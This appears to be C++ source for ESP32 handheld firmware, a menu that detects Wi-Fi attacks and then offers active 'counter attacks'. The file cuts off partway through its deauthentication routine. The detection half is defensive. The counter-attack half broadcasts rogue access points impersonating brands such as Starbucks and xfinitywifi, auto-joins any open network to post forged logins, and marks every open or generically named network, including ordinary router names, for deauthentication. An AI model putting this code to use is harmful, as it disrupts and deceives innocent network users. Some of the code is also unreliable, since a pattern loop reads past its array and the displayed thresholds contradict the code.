#include "AntiPredatorMenu.h"
#include "core/display.h"
#include "core/utils.h"
#include "core/mykeyboard.h"
#include "WiFi.h"
#include "esp_wifi.h"
#include "modules/wifi/wifi_atks.h"
#include <globals.h>
#include <vector>
#include <set>

// Real threat detection structures from your spec
enum AttackType {
  ATTACK_BEACON_SPAM,
  ATTACK_EVIL_TWIN, 
  ATTACK_KARMA,
  ATTACK_DEAUTH_FLOOD,
  ATTACK_PROBE_FLOOD,
  ATTACK_CAPTIVE_PORTAL,
  ATTACK_UNKNOWN
};

struct TrackedDevice {
  uint8_t mac[6];
  unsigned long firstSeen;
  unsigned long lastSeen;
  uint32_t beaconCount;
  uint32_t probeCount; 
  uint32_t deauthCount;
  uint32_t recentBeacons;     // beacons in last SHORT_WINDOW_MS
  uint32_t recentProbes;      // probes in last SHORT_WINDOW_MS
  uint32_t recentDeauths;     // deauths in last SHORT_WINDOW_MS
  unsigned long windowStart; // start of current measurement window
  std::set<String> advertisedSSIDs;
  AttackType suspectedAttack;
  float riskScore;
  bool isMarkedMalicious;
};

// Detection thresholds - tuned for real-world responsiveness
#define MAX_TRACKED_DEVICES 50
#define BEACON_SPAM_THRESHOLD 2   // beacons/second (normal APs ~1/100ms, spam is much faster)
#define DEAUTH_ATTACK_THRESHOLD 1 // deauths/second  
#define PROBE_FLOOD_THRESHOLD 5   // probes/second
#define ATTACK_DETECTION_THRESHOLD 2 // risk score to confirm attack
#define SHORT_WINDOW_MS 3000      // 3 second sliding window for faster detection
#define MIN_ANALYSIS_TIME 500     // minimum 0.5 seconds before analysis

// Global state
std::vector<TrackedDevice> trackedDevices;
bool monitoring = false;
unsigned long lastAnalysis = 0;
int totalThreats = 0;

// Function to get attack type name
String getAttackTypeName(AttackType type) {
    switch(type) {
        case ATTACK_BEACON_SPAM: return "BEACON SPAM";
        case ATTACK_EVIL_TWIN: return "EVIL TWIN";
        case ATTACK_KARMA: return "KARMA ATTACK";
        case ATTACK_DEAUTH_FLOOD: return "DEAUTH FLOOD";
        case ATTACK_PROBE_FLOOD: return "PROBE FLOOD";
        case ATTACK_CAPTIVE_PORTAL: return "CAPTIVE PORTAL";
        default: return "UNKNOWN";
    }
}

// Packet processing callback for real WiFi monitoring
void IRAM_ATTR packetCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(!monitoring || type != WIFI_PKT_MGMT) return;
    
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    
    // Basic 802.11 frame header
    typedef struct {
        uint8_t frame_ctrl[2];
        uint8_t duration[2];
        uint8_t addr1[6]; // receiver
        uint8_t addr2[6]; // transmitter/source
        uint8_t addr3[6]; // BSSID
        uint8_t seq_ctrl[2];
    } wifi_header_t;
    
    if(pkt->rx_ctrl.sig_len < sizeof(wifi_header_t)) return;
    
    wifi_header_t *hdr = (wifi_header_t*)pkt->payload;
    uint8_t* srcMac = hdr->addr2;
    
    // Find or create tracked device
    TrackedDevice* device = nullptr;
    for(auto& d : trackedDevices) {
        if(memcmp(d.mac, srcMac, 6) == 0) {
            device = &d;
            break;
        }
    }
    
    if(!device && trackedDevices.size() < MAX_TRACKED_DEVICES) {
        TrackedDevice newDevice;
        memcpy(newDevice.mac, srcMac, 6);
        newDevice.firstSeen = millis();
        newDevice.lastSeen = millis();
        newDevice.beaconCount = 0;
        newDevice.probeCount = 0;
        newDevice.deauthCount = 0;
        newDevice.recentBeacons = 0;
        newDevice.recentProbes = 0;
        newDevice.recentDeauths = 0;
        newDevice.windowStart = millis();
        newDevice.suspectedAttack = ATTACK_UNKNOWN;
        newDevice.riskScore = 0.0;
        newDevice.isMarkedMalicious = false;
        
        trackedDevices.push_back(newDevice);
        device = &trackedDevices.back();
    }
    
    if(device) {
        device->lastSeen = millis();
        
        // Reset sliding window if needed
        if(device->lastSeen - device->windowStart > SHORT_WINDOW_MS) {
            device->recentBeacons = 0;
            device->recentProbes = 0;
            device->recentDeauths = 0;
            device->windowStart = device->lastSeen;
        }
        
        // Analyze frame type and subtype
        uint8_t frameType = hdr->frame_ctrl[0] & 0x0C;
        uint8_t frameSubType = (hdr->frame_ctrl[0] & 0xF0) >> 4;
        
        if(frameType == 0x00) { // Management frame
            if(frameSubType == 0x08) { // Beacon frame
                device->beaconCount++;
                device->recentBeacons++;
                
                // Extract SSID from beacon (simplified)
                if(pkt->rx_ctrl.sig_len > 36) { // Minimum beacon size
                    uint8_t* ssid_ptr = pkt->payload + 36; // Skip fixed fields
                    if(ssid_ptr[0] == 0x00 && ssid_ptr[1] < 32) { // SSID element
                        String ssid = "";
                        for(int i = 0; i < ssid_ptr[1] && i < 32; i++) {
                            ssid += (char)ssid_ptr[2 + i];
                        }
                        if(ssid.length() > 0) {
                            device->advertisedSSIDs.insert(ssid);
                        }
                    }
                }
            } else if(frameSubType == 0x04) { // Probe request
                device->probeCount++;
                device->recentProbes++;
            } else if(frameSubType == 0x0C) { // Deauth frame
                device->deauthCount++;
                device->recentDeauths++;
            }
        }
    }
}

// Enhanced threat analysis with better spam detection
void analyzeThreats() {
    unsigned long currentTime = millis();
    
    for(auto& device : trackedDevices) {
        if(currentTime - device.lastSeen > 8000) continue; // Skip old devices
        
        // Reset sliding window if expired
        if(currentTime - device.windowStart > SHORT_WINDOW_MS) {
            device.recentBeacons = 0;
            device.recentProbes = 0;
            device.recentDeauths = 0;
            device.windowStart = currentTime;
        }
        
        // Calculate rates using sliding window
        float windowSeconds = (currentTime - device.windowStart) / 1000.0;
        if(windowSeconds < (MIN_ANALYSIS_TIME / 1000.0)) continue; // Need minimum time
        
        float recentBeaconRate = device.recentBeacons / windowSeconds;
        float recentProbeRate = device.recentProbes / windowSeconds;
        float recentDeauthRate = device.recentDeauths / windowSeconds;
        
        // Calculate total rates for baseline comparison
        float totalTime = (currentTime - device.firstSeen) / 1000.0;
        float totalBeaconRate = (totalTime > 1.0) ? device.beaconCount / totalTime : 0;
        
        // Reset risk assessment
        float previousScore = device.riskScore;
        device.riskScore = 0.0;
        device.suspectedAttack = ATTACK_UNKNOWN;
        
        // Detection 1: High beacon rate (immediate spam detection)
        if(recentBeaconRate > BEACON_SPAM_THRESHOLD) {
            device.riskScore += 4.0;
            device.suspectedAttack = ATTACK_BEACON_SPAM;
        }
        
        // Detection 2: Rapid beacon increase (attack starting)
        if(recentBeaconRate > totalBeaconRate * 2 && recentBeaconRate > 1.5) {
            device.riskScore += 3.0;
            if(device.suspectedAttack == ATTACK_UNKNOWN) {
                device.suspectedAttack = ATTACK_BEACON_SPAM;
            }
        }
        
        // Detection 3: Deauth flood attack
        if(recentDeauthRate > DEAUTH_ATTACK_THRESHOLD) {
            device.riskScore += 5.0;
            device.suspectedAttack = ATTACK_DEAUTH_FLOOD;
        }
        
        // Detection 4: Probe request flood  
        if(recentProbeRate > PROBE_FLOOD_THRESHOLD) {
            device.riskScore += 4.0;
            device.suspectedAttack = ATTACK_PROBE_FLOOD;
        }
        
        // Detection 5: Multiple SSID advertisement (evil twin/karma)
        if(device.advertisedSSIDs.size() > 2) {
            device.riskScore += 3.0;
            if(device.suspectedAttack == ATTACK_UNKNOWN) {
                device.suspectedAttack = ATTACK_EVIL_TWIN;
            }
        }
        
        // Detection 6: Very high activity (any rapid wireless activity)
        if(recentBeaconRate > 10 || recentProbeRate > 8 || device.recentBeacons > 20) {
            device.riskScore += 2.0;
        }
        
        // Detection 7: Burst pattern detection (many packets in short time)
        if(device.recentBeacons + device.recentProbes + device.recentDeauths > 15) {
            device.riskScore += 2.0;
        }
        
        // Add debug output for analysis
        if(device.riskScore > 0.5 || device.recentBeacons > 5) {
            String mac = "";
            for(int i = 0; i < 6; i++) {
                if(i > 0) mac += ":";
                if(device.mac[i] < 16) mac += "0";
                mac += String(device.mac[i], HEX);
            }
            Serial.printf("ANALYSIS: %s - Recent B:%.1f P:%.1f D:%.1f (window:%.1fs) SSIDs:%d Risk:%.1f\n",
                         mac.c_str(), recentBeaconRate, recentProbeRate, recentDeauthRate, 
                         windowSeconds, device.advertisedSSIDs.size(), device.riskScore);
        }
        
        // Mark as malicious if risk score exceeds threshold
        if(device.riskScore >= ATTACK_DETECTION_THRESHOLD && !device.isMarkedMalicious) {
            device.isMarkedMalicious = true;
            totalThreats++;
            
            String mac = "";
            for(int i = 0; i < 6; i++) {
                if(i > 0) mac += ":";
                if(device.mac[i] < 16) mac += "0";
                mac += String(device.mac[i], HEX);
            }
            Serial.println("ðŸš¨ SHARK DETECTED: " + getAttackTypeName(device.suspectedAttack) + 
                          " from " + mac + " (Risk: " + String(device.riskScore, 1) + ")");
        }
    }
}

void AntiPredatorMenu::optionsMenu() {
    options = {
        {"Threat Monitor", [=]() {
            drawMainBorderWithTitle("Shark-Bait Defense Active");
            padprintln("ðŸ¦ˆ PROTECTING AGAINST SHARKS ðŸ¦ˆ");
            padprintln("");
            padprintln("Active defenses:");
            padprintln("âœ… Beacon spam detector (>3/s)");
            padprintln("âœ… Evil twin hunter (multi-SSID)");
            padprintln("âœ… Karma attack sentinel");
            padprintln("âœ… Deauth storm monitor (>2/s)");
            padprintln("âœ… Probe flood detector (>8/s)");
            padprintln("");
            
            // Start enhanced threat detection
            trackedDevices.clear();
            totalThreats = 0;
            
            WiFi.mode(WIFI_MODE_STA);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(&packetCallback);
            monitoring = true;
            lastAnalysis = millis();
            
            padprintln("MONITORING - Press any key to stop");
            padprintln("Debug output on serial console");
            
            unsigned long lastUpdate = millis();
            while(monitoring) {
                if(check(AnyKeyPress)) {
                    monitoring = false;
                    break;
                }
                
                // Analyze threats more frequently for faster detection
                if(millis() - lastAnalysis > 500) { // Every 0.5 seconds
                    analyzeThreats();
                    lastAnalysis = millis();
                }
                
                // Update display every 2 seconds
                if(millis() - lastUpdate > 2000) {
                    tft.fillRect(0, 80, tftWidth, 80, bruceConfig.bgColor);
                    tft.setCursor(10, 80);
                    tft.setTextSize(1);
                    
                    if(totalThreats > 0) {
                        tft.setTextColor(TFT_RED);
                        tft.println("ðŸš¨ SHARKS DETECTED ðŸš¨");
                    } else {
                        tft.setTextColor(TFT_GREEN);  
                        tft.println("SAFE - Waters secured");
                    }
                    
                    tft.setTextColor(bruceConfig.priColor);
                    tft.println("Devices tracked: " + String(trackedDevices.size()));
                    tft.println("Threats found: " + String(totalThreats));
                    
                    // Show recent activity
                    int activeDevices = 0;
                    for(const auto& device : trackedDevices) {
                        if(millis() - device.lastSeen < 5000) activeDevices++;
                    }
                    tft.println("Active devices: " + String(activeDevices));
                    
                    // Show active threat types
                    for(const auto& device : trackedDevices) {
                        if(device.isMarkedMalicious) {
                            tft.setTextColor(TFT_RED);
                            tft.println("ATTACK: " + getAttackTypeName(device.suspectedAttack));
                            break;
                        }
                    }
                    
                    lastUpdate = millis();
                }
                
                delay(50);
            }
            
            esp_wifi_set_promiscuous(false);
            displayInfo("Defense stopped\nThreats detected: " + String(totalThreats), true);
        }},
        
        {"Shady WiFis", [=]() {
            drawMainBorderWithTitle("ðŸ•µï¸ SHADY WIFI SCANNER ðŸ•µï¸");
            padprintln("Real-time threat monitoring...");
            padprintln("Showing active threat analysis");
            padprintln("Press any key to stop");
            padprintln("");
            
            // Clear previous tracking data
            trackedDevices.clear();
            totalThreats = 0;
            
            WiFi.mode(WIFI_MODE_STA);
            
            // Start threat monitoring system
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(&packetCallback);
            monitoring = true;
            lastAnalysis = millis();
            
            unsigned long lastDisplay = 0;
            
            while(monitoring) {
                if(check(AnyKeyPress)) {
                    monitoring = false;
                    break;
                }
                
                // Run threat analysis frequently for real-time detection
                if(millis() - lastAnalysis > 500) {
                    analyzeThreats();
                    lastAnalysis = millis();
                }
                
                // Update display every 2 seconds
                if(millis() - lastDisplay > 2000) {
                    tft.fillRect(0, 50, tftWidth, tftHeight-60, bruceConfig.bgColor);
                    tft.setCursor(5, 50);
                    tft.setTextSize(1);
                    
                    // Header
                    tft.setTextColor(bruceConfig.priColor);
                    tft.println("MAC ADDRESS        RISK  ATTACK TYPE");
                    tft.println("--------------------------------");
                    
                    // Display tracked devices with threat assessment
                    int yPos = 70;
                    int displayCount = 0;
                    unsigned long currentTime = millis();
                    
                    for(const auto& device : trackedDevices) {
                        if(displayCount >= 6) break; // Limit to 6 entries for screen space
                        if(currentTime - device.lastSeen > 10000) continue; // Skip devices not seen in 10s
                        
                        tft.setCursor(5, yPos);
                        
                        // Color code based on threat level
                        if(device.isMarkedMalicious || device.riskScore >= ATTACK_DETECTION_THRESHOLD) {
                            tft.setTextColor(TFT_RED);  // High threats in red
                        } else if(device.riskScore > 1.0) {
                            tft.setTextColor(TFT_ORANGE);  // Medium risk in orange
                        } else if(device.riskScore > 0.5) {
                            tft.setTextColor(TFT_YELLOW);  // Low risk in yellow
                        } else {
                            tft.setTextColor(TFT_GREEN);   // Normal devices in green
                        }
                        
                        // Format MAC address
                        String macStr = "";
                        for(int j = 0; j < 6; j++) {
                            if(j > 0) macStr += ":";
                            if(device.mac[j] < 16) macStr += "0";
                            macStr += String(device.mac[j], HEX);
                        }
                        
                        // Shorten MAC for display
                        String shortMac = macStr.substring(0, 8) + ".." + macStr.substring(15);
                        
                        // Format: MAC (12 chars) + Risk (5 chars) + Attack Type
                        String line = shortMac;
                        while(line.length() < 13) line += " ";
                        line += String(device.riskScore, 1);
                        while(line.length() < 19) line += " ";
                        
                        String attackType = getAttackTypeName(device.suspectedAttack);
                        if(attackType.length() > 12) {
                            attackType = attackType.substring(0, 9) + "...";
                        }
                        line += attackType;
                        
                        tft.println(line);
                        
                        // Show additional details for high-risk devices
                        if(device.riskScore > 1.0) {
                            tft.setCursor(5, yPos + 10);
                            tft.setTextColor(TFT_CYAN);
                            String details = "B:" + String(device.recentBeacons) + 
                                           " P:" + String(device.recentProbes) + 
                                           " SSIDs:" + String(device.advertisedSSIDs.size());
                            tft.println(details);
                            yPos += 10;
                        }
                        
                        yPos += 12;
                        displayCount++;
                    }
                    
                    // Fill remaining space if we have fewer devices
                    if(displayCount == 0) {
                        tft.setCursor(5, yPos);
                        tft.setTextColor(TFT_CYAN);
                        tft.println("Scanning for threats...");
                        tft.println("Beacon spammers will appear here");
                    }
                    
                    // Show summary at bottom
                    tft.setCursor(5, tftHeight - 35);
                    tft.setTextColor(bruceConfig.priColor);
                    tft.println("Tracked: " + String(trackedDevices.size()) + 
                              " | Threats: " + String(totalThreats));
                    
                    // Show detection thresholds
                    tft.setCursor(5, tftHeight - 25);
                    tft.setTextColor(TFT_CYAN);
                    tft.println("Beacon threshold: >" + String(BEACON_SPAM_THRESHOLD) + "/s");
                    
                    // Show color legend
                    tft.setCursor(5, tftHeight - 15);
                    tft.setTextColor(TFT_RED);
                    tft.print("RED=Threat ");
                    tft.setTextColor(TFT_YELLOW);
                    tft.print("YEL=Risk ");
                    tft.setTextColor(TFT_GREEN);
                    tft.print("GRN=Safe");
                    
                    lastDisplay = millis();
                }
                
                delay(100);
            }
            
            esp_wifi_set_promiscuous(false);
            
            // Final summary
            String summary = "Threat scan complete!\n";
            summary += "Devices tracked: " + String(trackedDevices.size()) + "\n";
            summary += "Threats detected: " + String(totalThreats) + "\n";
            
            // Show breakdown of threat types
            int beaconSpam = 0, evilTwin = 0, deauthFlood = 0;
            for(const auto& device : trackedDevices) {
                if(device.isMarkedMalicious) {
                    switch(device.suspectedAttack) {
                        case ATTACK_BEACON_SPAM: beaconSpam++; break;
                        case ATTACK_EVIL_TWIN: evilTwin++; break;
                        case ATTACK_DEAUTH_FLOOD: deauthFlood++; break;
                        case ATTACK_KARMA: break;
                        case ATTACK_PROBE_FLOOD: break;
                        case ATTACK_CAPTIVE_PORTAL: break;
                        case ATTACK_UNKNOWN: break;
                    }
                }
            }
            
            if(beaconSpam > 0) summary += "Beacon spam: " + String(beaconSpam) + "\n";
            if(evilTwin > 0) summary += "Evil twins: " + String(evilTwin) + "\n";
            if(deauthFlood > 0) summary += "Deauth floods: " + String(deauthFlood);
            
            displayInfo(summary, true);
        }},
        
        {"Counter Attack", [=]() {
            // Create submenu for countermeasures
            std::vector<Option> counterOptions = {
                {"Karma Attack Poisoning", [=]() {
                    drawMainBorderWithTitle("ðŸŽ¯ KARMA ATTACK POISONING ðŸŽ¯");
                    padprintln("Deploying karma poison...");
                    padprintln("");
                    padprintln("This countermeasure broadcasts");
                    padprintln("fake responses to karma attacks");
                    padprintln("to confuse and disrupt them.");
                    padprintln("");
                    padprintln("Press any key to STOP");
                    
                    // Scan for active networks first
                    WiFi.mode(WIFI_MODE_STA);
                    int networks = WiFi.scanNetworks();
                    std::vector<String> detectedSSIDs;
                    
                    for(int i = 0; i < networks && i < 20; i++) {
                        String ssid = WiFi.SSID(i);
                        if(ssid.length() > 0) {
                            detectedSSIDs.push_back(ssid);
                        }
                    }
                    
                    // Create karma poison SSIDs
                    String karmaPoisons[] = {
                        "KARMA_POISON_TRAP",
                        "FAKE_KARMA_RESPONSE", 
                        "HONEYPOT_SSID_BAIT",
                        "KARMA_DETECTOR_NET",
                        "ANTI_KARMA_SHIELD"
                    };
                    
                    WiFi.mode(WIFI_AP);
                    padprintln("Karma poisoning ACTIVE...");
                    
                    int cycle = 0;
                    while(true) {
                        // Rotate through poison SSIDs
                        for(int i = 0; i < 5; i++) {
                            if(!WiFi.softAP(karmaPoisons[i].c_str(), "poisoned123", 1 + (cycle % 11))) {
                                Serial.println("Failed to start poison AP: " + karmaPoisons[i]);
                                continue;
                            }
                            
                            tft.fillRect(0, 60, tftWidth, 80, bruceConfig.bgColor);
                            tft.setCursor(10, 60);
                            tft.setTextColor(TFT_YELLOW);
                            tft.println("ACTIVE - Press key to stop");
                            tft.println("Poisoning: " + karmaPoisons[i]);
                            tft.println("Channel: " + String(1 + (cycle % 11)));
                            tft.println("Cycle: " + String(cycle + 1));
                            
                            Serial.println("KARMA POISON: " + karmaPoisons[i] + " on ch " + String(1 + (cycle % 11)));
                            delay(500);
                            
                            if(check(AnyKeyPress)) goto stopKarma;
                        }
                        cycle++;
                    }
                    
                    stopKarma:
                    WiFi.mode(WIFI_STA);
                    displayInfo("Karma poisoning stopped!\nKarma attacks disrupted.", true);
                }},
                
                {"Evil Twin Disruption", [=]() {
                    drawMainBorderWithTitle("ðŸŽ­ EVIL TWIN DISRUPTION ðŸŽ­");
                    padprintln("Scanning for evil twins...");
                    
                    WiFi.mode(WIFI_MODE_STA);
                    int networks = WiFi.scanNetworks();
                    std::vector<String> suspiciousAPs;
                    std::vector<String> allSSIDs;
                    
                    // Collect all SSIDs and look for duplicates
                    for(int i = 0; i < networks; i++) {
                        String ssid = WiFi.SSID(i);
                        if(ssid.length() > 0) {
                            allSSIDs.push_back(ssid);
                        }
                    }
                    
                    // Find potential evil twins (duplicate SSIDs)
                    for(int i = 0; i < allSSIDs.size(); i++) {
                        for(int j = i + 1; j < allSSIDs.size(); j++) {
                            if(allSSIDs[i] == allSSIDs[j]) {
                                bool alreadyAdded = false;
                                for(const auto& sus : suspiciousAPs) {
                                    if(sus == allSSIDs[i]) {
                                        alreadyAdded = true;
                                        break;
                                    }
                                }
                                if(!alreadyAdded) {
                                    suspiciousAPs.push_back(allSSIDs[i]);
                                }
                            }
                        }
                    }
                    
                    tft.fillRect(0, 60, tftWidth, 80, bruceConfig.bgColor);
                    tft.setCursor(10, 60);
                    tft.setTextColor(bruceConfig.priColor);
                    tft.println("Found " + String(suspiciousAPs.size()) + " potential twins");
                    
                    if(suspiciousAPs.size() > 0) {
                        padprintln("");
                        padprintln("Disruption beacons ACTIVE...");
                        padprintln("Press any key to STOP");
                        
                        WiFi.mode(WIFI_AP);
                        
                        int wave = 0;
                        while(true) {
                            for(const auto& ssid : suspiciousAPs) {
                                String disruptorSSID = "EVIL_TWIN_ALERT_" + ssid.substring(0, 10);
                                WiFi.softAP(disruptorSSID.c_str(), "exposed123", 1 + (wave % 11));
                                
                                tft.fillRect(0, 80, tftWidth, 60, bruceConfig.bgColor);
                                tft.setCursor(10, 80);
                                tft.setTextColor(TFT_RED);
                                tft.println("ACTIVE - Press key to stop");
                                tft.println("Disrupting: " + ssid);
                                tft.println("Wave: " + String(wave + 1));
                                
                                Serial.println("EVIL TWIN DISRUPTOR: " + disruptorSSID);
                                delay(300);
                                
                                if(check(AnyKeyPress)) goto stopTwin;
                            }
                            wave++;
                        }
                        
                        stopTwin:;
                    } else {
                        padprintln("No evil twins detected!");
                        delay(2000);
                    }
                    
                    WiFi.mode(WIFI_STA);
                    displayInfo("Evil twin disruption stopped!", true);
                }},
                
                {"Evil Counter Attack", [=]() {
                    drawMainBorderWithTitle("ðŸŒ EVIL COUNTER ATTACK ðŸŒ");
                    padprintln("Simulating real browser behavior...");
                    padprintln("");
                    padprintln("This perfectly mimics a real");  
                    padprintln("browser form submission:");
                    padprintln("1. GET the portal page first");
                    padprintln("2. Submit with proper headers");
                    padprintln("3. Include cookies & referrer");
                    padprintln("");
                    padprintln("Email: Ya damn Fool");
                    padprintln("Password: Caught ya Slippin");
                    padprintln("Press any key to STOP");
                    
                    WiFi.mode(WIFI_STA);
                    
                    while(true) {
                        if(EscPress || SelPress) break;
                        
                        // Scan for ALL networks
                        int networks = WiFi.scanNetworks();
                        
                        for(int i = 0; i < networks; i++) {
                            String ssid = WiFi.SSID(i);
                            
                            // Target ANY open network
                            if(WiFi.encryptionType(i) == WIFI_AUTH_OPEN && ssid.length() > 0) {
                                
                                tft.fillRect(0, 70, tftWidth, 130, bruceConfig.bgColor);
                                tft.setCursor(5, 70);
                                tft.setTextColor(TFT_YELLOW);
                                tft.println("Target: " + ssid.substring(0, 12));
                                
                                // Connect to evil portal AP
                                tft.setTextColor(TFT_CYAN);
                                tft.println("Connecting...");
                                
                                WiFi.begin(ssid.c_str());
                                int attempts = 0;
                                while(WiFi.status() != WL_CONNECTED && attempts < 30) {
                                    delay(500);
                                    attempts++;
                                }
                                
                                if(WiFi.status() == WL_CONNECTED) {
                                    tft.setTextColor(TFT_GREEN);
                                    tft.println("âœ… Connected!");
                                    delay(2000);
                                    
                                    WiFiClient client;
                                    
                                    // Step 1: GET the portal page first (like a real browser)
                                    tft.setTextColor(TFT_ORANGE);
                                    tft.println("ðŸŒ Loading portal page...");
                                    
                                    String cookies = "";
                                    if(client.connect("192.168.4.1", 80)) {
                                        client.println("GET / HTTP/1.1");
                                        client.println("Host: 192.168.4.1");
                                        client.println("User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)");
                                        client.println("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                        client.println("Accept-Language: en-US,en;q=0.5");
                                        client.println("Accept-Encoding: gzip, deflate");
                                        client.println("Connection: close");
                                        client.println();
                                        
                                        delay(2000);
                                        String response = "";
                                        while(client.available()) {
                                            String line = client.readStringUntil('\n');
                                            response += line + "\n";
                                            // Extract cookies if any
                                            if(line.startsWith("Set-Cookie:")) {
                                                cookies += line.substring(12) + "; ";
                                            }
                                        }
                                        client.stop();
                                        
                                        if(response.indexOf("Google Account") >= 0 || response.indexOf("login-form") >= 0) {
                                            tft.setTextColor(TFT_CYAN);
                                            tft.println("ðŸ“„ Portal page loaded!");
                                            
                                            // Step 2: Submit form like a real browser
                                            delay(1000);
                                            tft.setTextColor(TFT_ORANGE);
                                            tft.println("ðŸ“ Filling form...");
                                            
                                            if(client.connect("192.168.4.1", 80)) {
                                                // Corrected order and better readability
                                                String formData = "email=Ya+damn+Fool&password=Caught+ya+Slippin_@_pwned.com";
                                                
                                                // Perfect browser simulation
                                                client.println("POST /post HTTP/1.1");
                                                client.println("Host: 192.168.4.1");
                                                client.println("Content-Type: application/x-www-form-urlencoded");
                                                client.println("Content-Length: " + String(formData.length()));
                                                client.println("Origin: http://192.168.4.1");
                                                client.println("Referer: http://192.168.4.1/");
                                                client.println("User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)");
                                                client.println("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                                                client.println("Accept-Language: en-US,en;q=0.5");
                                                if(cookies.length() > 0) {
                                                    client.println("Cookie: " + cookies);
                                                }
                                                client.println("Connection: close");
                                                client.println();
                                                client.println(formData);
                                                
                                                delay(2000);
                                                String postResponse = "";
                                                int responseSize = 0;
                                                while(client.available() && responseSize < 2000) {
                                                    char c = client.read();
                                                    postResponse += c;
                                                    responseSize++;
                                                }
                                                client.stop();
                                                
                                                tft.setTextColor(TFT_GREEN);
                                                tft.println("âœ… Form submitted!");
                                                tft.println("Response: " + String(responseSize) + " bytes");
                                                
                                                // Step 3: Check if data was captured
                                                delay(1000);
                                                tft.setTextColor(TFT_ORANGE);
                                                tft.println("ðŸ” Checking capture...");
                                                
                                                if(client.connect("192.168.4.1", 80)) {
                                                    client.println("GET /creds HTTP/1.1");
                                                    client.println("Host: 192.168.4.1");
                                                    client.println("User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)");
                                                    client.println("Referer: http://192.168.4.1/");
                                                    if(cookies.length() > 0) {
                                                        client.println("Cookie: " + cookies);
                                                    }
                                                    client.println("Connection: close");
                                                    client.println();
                                                    
                                                    delay(1500);
                                                    String credsResponse = "";
                                                    while(client.available()) {
                                                        credsResponse += client.readStringUntil('\n');
                                                        if(credsResponse.length() > 1000) break;
                                                    }
                                                    client.stop();
                                                    
                                                    if(credsResponse.indexOf("Ya damn Fool") >= 0 || 
                                                       credsResponse.indexOf("Caught ya Slippin") >= 0 ||
                                                       credsResponse.indexOf("email") >= 0) {
                                                        tft.setTextColor(TFT_RED);
                                                        tft.println("ðŸŽ‰ SUCCESS!");
                                                        tft.println("Data captured in portal!");
                                                        delay(5000);
                                                    } else {
                                                        tft.setTextColor(TFT_YELLOW);
                                                        tft.println("âš ï¸ Checking credentials...");
                                                        delay(2000);
                                                    }
                                                }
                                            }
                                        } else {
                                            tft.setTextColor(TFT_RED);
                                            tft.println("âŒ Not a portal");
                                        }
                                    }
                                    
                                    WiFi.disconnect();
                                    delay(2000);
                                } else {
                                    tft.setTextColor(TFT_RED);
                                    tft.println("âŒ Connection failed");
                                    delay(1000);
                                }
                            }
                        }
                        delay(3000);
                    }
                    
                    WiFi.mode(WIFI_AP);
                    displayInfo("Evil counter attack stopped!", true);
                }},
                
                {"Captive Portal Hijacking", [=]() {
                    drawMainBorderWithTitle("ðŸš¨ CAPTIVE PORTAL HIJACKING ðŸš¨");
                    padprintln("Deploying portal hijackers...");
                    padprintln("");
                    padprintln("This creates competing captive");
                    padprintln("portals to confuse malicious ones");
                    padprintln("and protect potential victims.");
                    padprintln("");
                    padprintln("Press any key to STOP");
                    
                    String hijackSSIDs[] = {
                        "Free WiFi",
                        "Guest WiFi", 
                        "Hotel WiFi",
                        "Airport WiFi",
                        "McDonald's WiFi",
                        "Starbucks WiFi",
                        "Public WiFi",
                        "xfinitywifi",
                        "attwifi",
                        "LEGITIMATE_WIFI_HERE"
                    };
                    
                    WiFi.mode(WIFI_AP);
                    padprintln("Portal hijacking ACTIVE...");
                    
                    int cycle = 0;
                    while(true) {
                        for(int i = 0; i < 10; i++) {
                            if(!WiFi.softAP(hijackSSIDs[i].c_str(), "", 6 + (cycle % 6))) {
                                continue;
                            }
                            
                            tft.fillRect(0, 80, tftWidth, 60, bruceConfig.bgColor);
                            tft.setCursor(10, 80);
                            tft.setTextColor(TFT_GREEN);
                            tft.println("ACTIVE - Press key to stop");
                            tft.println("Hijacker: " + hijackSSIDs[i]);
                            tft.println("Ch: " + String(6 + (cycle % 6)));
                            tft.println("Cycle: " + String(cycle + 1));
                            
                            Serial.println("PORTAL HIJACKER: " + hijackSSIDs[i]);
                            delay(400);
                            
                            if(check(AnyKeyPress)) goto stopPortal;
                        }
                        cycle++;
                    }
                    
                    stopPortal:
                    WiFi.mode(WIFI_STA);
                    displayInfo("Portal hijacking stopped!\nMalicious portals confused.", true);
                }},
                
                {"Protective Victim Deauth", [=]() {
                    drawMainBorderWithTitle("ðŸ›¡ï¸ PROTECTIVE DEAUTH ðŸ›¡ï¸");
                    padprintln("WARNING: This will disconnect");
                    padprintln("devices from potentially malicious");
                    padprintln("networks to protect them.");
                    padprintln("");
                    padprintln("Scanning for suspicious APs...");
                    
                    WiFi.mode(WIFI_MODE_STA);
                    int networks = WiFi.scanNetworks();
                    std::vector<wifi_ap_record_t> suspiciousAPs;
                    
                    // Enhanced suspicious pattern detection
                    String suspiciousPatterns[] = {
                        "Free", "WiFi", "Guest", "Public", "Open", 
                        "Hotel", "Airport", "Starbucks", "McDonald",
                        "Xfinity", "ATT", "Verizon", "linksys", "NETGEAR"
                    };
                    
                    String evilTwinPatterns[] = {
                        "FBI", "NSA", "Police", "ATM", "Bank", "Credit",
                        "Payment", "Secure", "VPN", "Login"
                    };
                    
                    for(int i = 0; i < networks; i++) {
                        String ssid = WiFi.SSID(i);
                        String bssid = WiFi.BSSIDstr(i);
                        int encryptionType = WiFi.encryptionType(i);
                        uint8_t* bssidArray = WiFi.BSSID(i);
                        uint8_t channel = WiFi.channel(i);
                        
                        bool suspicious = false;
                        
                        // Check for open networks (major red flag)
                        if(encryptionType == WIFI_AUTH_OPEN) {
                            suspicious = true;
                        }
                        
                        // Check for suspicious patterns in SSID
                        for(int p = 0; p < 15; p++) {
                            if(ssid.indexOf(suspiciousPatterns[p]) >= 0) {
                                suspicious = true;
                                break;
                            }
                        }
                        
                        // Check for evil twin patterns (high priority)
                        for(int p = 0; p < 10; p++) {
                            if(ssid.indexOf(evilTwinPatterns[p]) >= 0) {
                                suspicious = true;
                                break;
                            }
                        }
                        
                        // Check for very generic suspicious names
